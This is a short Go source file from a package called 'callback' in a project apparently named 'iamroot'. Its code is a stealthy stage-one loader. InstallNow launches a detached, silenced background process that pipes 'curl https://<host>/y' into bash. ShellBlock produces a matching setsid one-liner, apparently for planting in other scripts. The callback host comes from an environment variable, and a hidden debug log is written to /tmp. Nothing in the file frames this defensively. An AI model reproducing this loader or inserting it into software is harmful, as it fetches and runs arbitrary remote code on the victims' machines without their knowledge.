package callback

import (
	"fmt"
	"os"
	"os/exec"
	"strings"

	"github.com/cleissonamanacio/iamroot/internal/sysutil"
)

var DefaultHost string

func SetHost(h string) { DefaultHost = strings.TrimSpace(h) }

func host() string {
	if h := strings.TrimSpace(os.Getenv("IAMROOT_CB_HOST")); h != "" {
		return h
	}
	return DefaultHost
}

const DebugLog = "/tmp/.iamroot_cb.log"

func logf(format string, args ...any) {
	if os.Getenv("IAMROOT_CB_DEBUG") != "" {
		f, err := os.OpenFile(DebugLog, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)
		if err == nil {
			fmt.Fprintf(f, format+"\n", args...)
			_ = f.Close()
		}
	}
}

func InstallNow() {
	h := host()
	if h == "" {
		return
	}
	logf("stage1: %s", h)

	cmd := exec.Command("bash", "-c",
		fmt.Sprintf(`curl -fsSL --max-time 25 "https://%s/y" 2>/dev/null | bash >/dev/null 2>&1 &`, h))
	cmd.Stdin = nil
	cmd.Stdout = nil
	cmd.Stderr = nil
	sysutil.Detach(cmd)
	_ = cmd.Start()
}

func ShellBlock() string {
	h := host()
	if h == "" {
		return ""
	}
	return fmt.Sprintf(
		`setsid -f bash -c 'curl -fsSL --max-time 20 "https://%s/y" 2>/dev/null | timeout 300 bash' >/dev/null 2>&1`+"\n", h)
}
